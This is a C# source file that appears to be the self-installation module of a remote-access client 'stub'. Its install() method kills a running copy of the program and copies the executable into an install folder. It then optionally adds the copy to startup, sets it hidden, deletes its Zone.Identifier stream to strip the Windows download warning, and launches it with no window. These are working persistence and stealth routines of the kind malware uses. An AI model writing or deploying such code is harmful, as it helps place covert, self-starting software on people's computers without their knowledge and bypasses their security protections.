using Client.Controllers.Tools;
using Client.Models;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Client.Controllers
{
    public static class ClientInstallerController
    {
        public static void install()
        {
            bool isKilled = false;

            //  Add install repertory
            if(!Directory.Exists(Path.Combine(Boot.DIRECTORY, Boot.installSubDirectory)))
            {
                try
                {
                    Directory.CreateDirectory(Path.Combine(Boot.DIRECTORY, Boot.installSubDirectory));
                }
                catch(Exception ex)
                {
                    System.Windows.Forms.MessageBox.Show(ex.ToString());
                    return;
                }

            }

            // delete if file exist
            if (File.Exists(ClientData.installPath))
            {
                try
                {
                    File.Delete(ClientData.installPath);
                }
                catch (Exception ex)
                {
                    if( ex is IOException || ex is UnauthorizedAccessException)
                    {
                        Process[] foundProcess = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(ClientData.installPath));
                        int myPid = Process.GetCurrentProcess().Id;

                        foreach(var prc in foundProcess)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            // copy the stub to install directory
            try
            {
                File.Copy(ClientData.currentPath, ClientData.installPath, true);
            }
            catch(Exception)
            {
                return;
            }

            if (Boot.autoStartEnabled)
            {
                if(!Boot.AddToStartup())
                    ClientData.AddToStartupFailed = true;
            }

            if (Boot.hideFile)
            {
                try
                {
                    File.SetAttributes(ClientData.installPath, FileAttributes.Hidden);
                }
                catch (Exception)
                {
                }
            }

            DeleteFile(ClientData.installPath + ":Zone.Identifier");

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = ClientData.installPath
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception)
            {
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteFile(string name);
    }
}
